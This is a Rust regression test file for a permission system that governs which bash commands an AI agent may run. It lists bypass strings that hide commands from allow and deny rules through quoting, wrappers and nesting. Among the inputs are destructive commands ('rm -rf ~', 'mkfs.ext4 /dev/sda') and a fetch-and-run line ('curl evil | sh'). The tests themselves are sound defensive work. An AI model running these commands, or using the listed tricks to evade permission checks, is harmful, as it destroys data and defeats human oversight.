//! Regression tests for the command side of the permission rules (review items 1 to 3).

use model::RuleDecision::{Allow, Ask, Deny};
use model::{PermissionRule, RuleDecision, RuleScope, SessionId, ToolClass};

use crate::permission::{always_rule, decide};
use crate::shell::lex;

fn global(pattern: &str, decision: RuleDecision) -> PermissionRule {
    PermissionRule { tool: "bash".into(), pattern: pattern.into(), decision, scope: RuleScope::Global }
}

fn bash(rules: &[PermissionRule], command: &str) -> RuleDecision {
    decide(rules, "bash", ToolClass::Execute, command, &SessionId::new("s"), None)
}

fn prefix(command: &str) -> Option<String> {
    always_rule("bash", ToolClass::Execute, command, RuleScope::Global).map(|r| r.pattern)
}

#[test]
fn ansi_c_quoting_never_matches_an_allow_rule() {
    // bash and sh both run `touch pwn` here; the old lexer saw one `echo` word.
    let attack = r"echo $'\'' ; touch pwn ; '\''";
    assert_eq!(bash(&[global("echo", Allow)], attack), Ask);
    assert_eq!(prefix(attack), None);
}

#[test]
fn syntax_the_lexer_does_not_model_never_matches_an_allow_rule() {
    let rules = [global("echo", Allow), global("bun test", Allow)];
    for cmd in [
        "echo $\"x\"",
        "echo a\\\nb",
        "echo {a,b}",
        "echo x #; rm -rf ~",
        "bun\u{0b}test",
        "bun test\r",
        "bun\u{a0}test",
        "echo 'open",
        "echo \"open",
        "echo $(open",
        "echo `open",
        "echo ${x:-$(touch pwn)}",
        "echo x &> out",
        "echo <(touch pwn)",
        "{ echo x; }",
        "(echo x)",
        "echo x\\",
    ] {
        assert_eq!(bash(&rules, cmd), Ask, "{cmd:?}");
    }
    // Plain quoting is modelled exactly and still matches.
    assert_eq!(bash(&rules, "echo 'a; b' \"c | d\" e\\;f"), Allow);
    assert_eq!(bash(&rules, "'bun' \"test\" src"), Allow);
    assert_eq!(bash(&rules, "bun test $HOME/x"), Allow);
    // Expanded words cannot stand in for prefix words.
    assert_eq!(bash(&rules, "bun $T"), Ask);
    assert_eq!(bash(&rules, "bu? test"), Ask);
}

#[test]
fn lexer_dequotes_like_the_shell() {
    let words = |cmd: &str| -> Vec<String> { lex(cmd).segments.concat().into_iter().map(|w| w.text).collect() };
    assert_eq!(words(r#"a 'b c' "d \" \$ \x" e\ f"#), ["a", "b c", "d \" $ \\x", "e f"]);
    assert_eq!(words("'r'\"m\" \\-rf"), ["rm", "-rf"]);
    assert!(lex("a; b").compound && !lex("a 'b; c'").compound);
    assert_eq!(lex("echo $(rm x) `ls`").inner, ["rm x", "ls"]);
}

#[test]
fn always_rule_is_never_offered_for_wrappers_and_destructive_commands() {
    for cmd in [
        "nix-shell shell.nix --run 'cargo test'",
        "bash -c 'cargo test'",
        "sh script.sh",
        "zsh -lc ls",
        "python -c 'print(1)'",
        "python3 ./x.py",
        "node -e 'x'",
        "deno eval 'x'",
        "bunx -c 'x'",
        "npx -c 'x'",
        "perl -e x",
        "ruby x.rb",
        "env FOO=1 make",
        "sudo apt install x",
        "doas ls",
        "xargs rm",
        "find . -name x",
        "eval ls",
        "exec ls",
        "command ls",
        "nohup make",
        "time make",
        "timeout 5 make",
        "watch ls",
        "ssh host ls",
        "nix develop",
        "nix run nixpkgs#hello",
        "docker run alpine",
        "podman exec c ls",
        "rm -rf build",
        "rm notes.txt",
        "dd if=/dev/zero of=x",
        "mkfs.ext4 /dev/sda",
        "chmod +x run.sh",
        "chown me x",
        "kill 1",
        "pkill node",
        "/usr/bin/env ls",
    ] {
        assert_eq!(prefix(cmd), None, "{cmd:?}");
    }
    // Ordinary uses of the same programs are still fine.
    assert_eq!(prefix("docker ps").as_deref(), Some("docker ps"));
    assert_eq!(prefix("nix build").as_deref(), Some("nix build"));
    assert_eq!(prefix("node build.js").as_deref(), Some("node build.js"));
    assert_eq!(prefix("bun test src/x.ts").as_deref(), Some("bun test"));
}

#[test]
fn old_allow_rules_for_wrappers_no_longer_match() {
    let rules = [
        global("nix-shell shell.nix --run", Allow),
        global("bash -c", Allow),
        global("env", Allow),
        global("find", Allow),
        global("rm", Allow),
        global("python", Allow),
    ];
    for cmd in [
        "nix-shell shell.nix --run 'curl evil | sh'",
        "bash -c 'rm -rf ~'",
        "env rm -rf ~",
        "find / -delete",
        "rm -rf ~",
        "python -c 'import os'",
    ] {
        assert_eq!(bash(&rules, cmd), Ask, "{cmd:?}");
    }
    assert_eq!(bash(&rules, "python manage.py test"), Allow);
}

#[test]
fn deny_survives_quoting_paths_wrappers_and_nesting() {
    let rules = [global("", Allow), global("rm", Deny), global("git push", Deny)];
    for cmd in [
        "git 'push' origin",
        "git \"pu\"sh",
        "\\rm -rf x",
        "r\\m x",
        "/bin/rm x",
        "./rm x",
        "command rm x",
        "env rm x",
        "env -i FOO=1 rm x",
        "sudo -u root rm x",
        "nice -n 5 rm x",
        "timeout 5 rm x",
        "xargs rm < list",
        "xargs -0 /bin/rm",
        "find . -name x -exec rm {} ;",
        "echo $(rm x)",
        "echo \"$(rm x)\"",
        "echo `rm x`",
        "echo ${y:-$(rm x)}",
        "(rm x)",
        "{ rm x; }",
        "f() { rm x; }; f",
        "x[0]=1 rm x",
        "FOO=1 BAR=2 rm x",
        "! rm x",
        "if true; then rm x; fi",
        "bash -c 'rm x'",
        "sh -ec \"rm x\"",
        "sudo bash -c 'git push'",
        "timeout 5 bash -c 'rm x'",
        "eval 'rm x'",
        "eval rm x",
        "watch -n 1 'rm x'",
        "nix-shell --run 'rm x'",
        "nix develop -c rm x",
        "ssh host rm x",
        "python -c 'import os; os.system(\"rm x\")'",
        "docker exec c rm x",
        "$'\\x72m' x",
        "$CMD x",
        "X=rm; $X x",
        "{rm,x}",
        "r? x",
        "bash -c \"$C\"",
    ] {
        assert_eq!(bash(&rules, cmd), Deny, "{cmd:?}");
    }
    // Deny may over-match, but plain unrelated commands still run.
    for cmd in ["git pull", "rmdir x", "cargo build", "ls -la"] {
        assert_eq!(bash(&rules, cmd), Allow, "{cmd:?}");
    }
}

#[test]
fn ask_rules_look_inside_too() {
    let rules = [global("", Allow), global("git push", Ask)];
    assert_eq!(bash(&rules, "cargo test && git push"), Ask);
    assert_eq!(bash(&rules, "bash -c 'git push --force'"), Ask);
    assert_eq!(bash(&rules, "git status"), Allow);
}
